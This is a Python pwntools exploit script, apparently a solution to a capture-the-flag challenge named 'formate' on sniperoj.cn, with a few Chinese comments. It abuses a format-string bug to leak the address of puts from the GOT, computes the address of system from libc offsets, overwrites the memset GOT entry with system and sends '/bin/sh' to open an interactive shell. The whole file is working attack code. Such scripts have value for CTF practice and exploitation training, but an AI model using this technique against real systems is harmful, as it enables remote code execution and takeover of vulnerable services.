#coding:utf-8
from pwn import *
 
context(arch = 'i386', os = 'linux') 
DEBUG   = 1
LOCAL = 1
target = 'formate'  
break_points = ['0x080487DF','0x08048837'] 
remote_addr = 'www.sniperoj.cn'
remote_port = 30020
 
if LOCAL:
    p = process('./'+target)
else:
    p = remote(remote_addr,remote_port)
 
if DEBUG:
    cmd_bp = ''
    if break_points:
        for bp in break_points:
            cmd_bp += 'b *{}\n'.format(bp)
    gdb.attach(proc.pidof(p)[0],cmd_bp)
    context.log_level = 'DEBUG'

elf = ELF('./'+target)
libc = ELF('libc.so.6')
memset_got = elf.got['memset']
puts_got = elf.got['puts']
# leak puts_got address
p.sendlineafter('choice:','2') # leave_message
payload1 = p32(puts_got)+"%7$s"
p.sendlineafter('message',payload1) 
p.sendlineafter('choice:','3') # print_message
res = p.recvuntil('choice:')
puts_addr = u32(res[21:25])
log.info('[+] puts address:{:x}'.format(puts_addr))
system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system']) 
log.info('[+] system address:{:x}'.format(system_addr))

#修改memset的got表为system的地址
p.sendline('2')
# byte1 = system_addr & 0xff  #地址为低6位不同，先写最低2位
# byte2 = (system_addr & 0xffff00) >> 8  #然后写中间4位
# payload2 = '%{}c%{}$hhn'.format(byte1,15)  #参数本来偏移就是7，然后前面还要放32位的数据，所以最终参数偏移为7+(32/4)
# payload2 += '%{}c%{}$hn'.format(byte2-byte1,16)
# payload2 = payload2.ljust(32,'a')  #补足32位
# print payload2,len(payload2)
# payload2 += p32(memset_got) + p32(memset_got+1)
payload2 = fmtstr_payload(7, {memset_got: system_addr}) #pwntools的自动生成payload函数
print payload2
p.sendlineafter('message',payload2)
p.sendlineafter('choice:','3') # print_message
p.sendline("2")
p.sendline("/bin/sh\0")
p.sendline("2")
p.interactive()
